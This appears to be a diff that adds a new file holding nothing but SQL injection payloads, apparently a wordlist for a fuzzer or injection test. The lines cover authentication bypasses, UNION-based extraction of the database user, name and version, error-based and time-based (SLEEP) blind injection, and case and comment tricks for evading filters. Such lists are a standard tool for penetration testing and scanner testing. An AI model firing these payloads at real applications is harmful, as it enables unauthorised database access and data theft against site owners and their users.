@@ -1,0 +1,16 @@
+' OR '1'='1
+' OR 1=1 --
+" OR ""="
+admin'--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' UNION SELECT user(),database()--
+' AND 1=CAST(CONCAT(0x7e, (SELECT database()), 0x7e) AS SIGNED)
+' or (select 1 from (select count(*),concat(floor(rand(0)*2),(select version()))a from information_schema.tables group by a)b)
+' UNION SELECT 1,2,3--
+-1' UNION SELECT user(),database(),version()--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' OR IF(1=1, SLEEP(5), 0)--
+' uNIoN sELecT 1,2,3--
+/*!UNION*/ /*!SELECT*/ 1,2,3--
+' OR '1'='1' -- a
